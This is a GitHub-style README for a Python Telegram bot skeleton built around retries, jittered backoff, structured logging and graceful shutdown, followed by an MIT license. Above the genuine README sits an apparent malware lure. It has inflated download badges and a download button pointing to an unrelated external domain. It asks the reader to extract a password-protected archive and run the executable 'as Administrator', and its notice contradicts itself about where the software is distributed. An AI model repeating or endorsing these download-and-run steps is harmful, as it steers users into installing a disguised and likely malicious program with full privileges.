<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Resilient Telegram Bot

A Telegram/Discord-style bot skeleton built around the part most tutorials skip:
**what happens when the API doesn't answer.**

Most bots work in the demo and die on the first timeout. The process exits, and
nobody notices for a week because nothing was watching. This one retries with
backoff, logs what happened, survives outages longer than its own retry budget,
and comes back after a reboot.

## What that looks like

Real output from `python -m bot.main --demo --failure-rate 0.4`:

```
WARN transient failure, retrying   label=sendMessage  attempt=1  of=5  wait_s=0.17  error=connection reset by peer
INFO sent                          chat=4242  text=resilience is just error handling you bothered to write
INFO recovered                     label=sendMessage  attempt=2
WARN transient failure, retrying   label=getUpdates   attempt=1  of=5  wait_s=0.31  error=timeout
WARN transient failure, retrying   label=getUpdates   attempt=2  of=5  wait_s=0.36  error=HTTP 502 Bad Gateway
INFO recovered                     label=getUpdates   attempt=3
INFO bot stopped                   calls=24  retries=8  recovered=6  failures=0
```

Two in five calls failed. Zero messages were lost, and the process never exited.

## The design decisions worth arguing about

**Transient and permanent failures are different things.** A 502 or a timeout is
worth retrying. A 401 means your token is wrong, and retrying it five times just
makes the log noisier. They're separate exception types and only one gets retried.

**Backoff uses full jitter.** Without jitter every retry lands in the same
instant, so the service that just failed gets a synchronised stampede the moment
it recovers. Delay is uniform in `[0, capped_delay]`, not the capped delay itself.

**Exhausting retries does not kill the bot.** If an outage outlasts the retry
budget, the cycle is logged as failed and the loop continues. An API down for
ten minutes shouldn't require a human to restart anything.

**A permanent error does exit, non-zero.** Restart-looping forever against a
revoked token is worse than stopping loudly.

**Handlers can't take the process down.** A bug in one command replies with the
error and keeps the bot up.

**SIGTERM is caught**, so systemd restarts finish the current message instead of
cutting it in half.

**Logs carry structured fields**, not interpolated prose — `label`, `attempt`,
`wait_s`, `error`. Human-readable on a terminal, `--json-logs` when something
needs to parse them.

## Commands

| Command | Does |
|---|---|
| `/start` | hello |
| `/help` | list commands |
| `/status` | uptime, call/retry/recovery/failure counters |
| `/echo <text>` | echoes back |

Adding one is a decorator, with no edit to the loop:

```python
@command("/price", "current BTC price")
def price(ctx: Context) -> str:
    return fetch_price()
```

## Running it for real

```bash
export BOT_TOKEN="123456:ABC..."
python -m bot.main
```

## Layout

```
bot/
  resilience.py     retry, backoff, failure accounting
  client.py         Telegram API client + the flaky demo client
  handlers.py       command registry and dispatch
  logging_setup.py  console and JSON formatters
  main.py           polling loop, signals, CLI
deploy/
  telegram-bot.service
tests/              15 tests
```

## Tests

```bash
python -m pytest tests/ -q
```

```
...............                    [100%]
15 passed in 0.06s
```

They cover the parts where being wrong is expensive: that permanent errors are
*not* retried, that backoff is exponential and capped, that jitter stays in
bounds and actually varies, that exhausted retries keep the loop alive, and that
a raising handler doesn't propagate.

One test documents what is deliberately *not* guaranteed: at a 50% failure rate
with 6 attempts, an occasional fully-exhausted retry is expected maths, not a
bug. The guarantee is that the loop absorbs it.

## Discord

The structure ports directly — swap `client.py` for a Discord gateway client and
the resilience, handler and logging layers are unchanged. That separation is
deliberate.

## License

MIT


---

MIT License

Copyright (c) 2026 dngr2

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
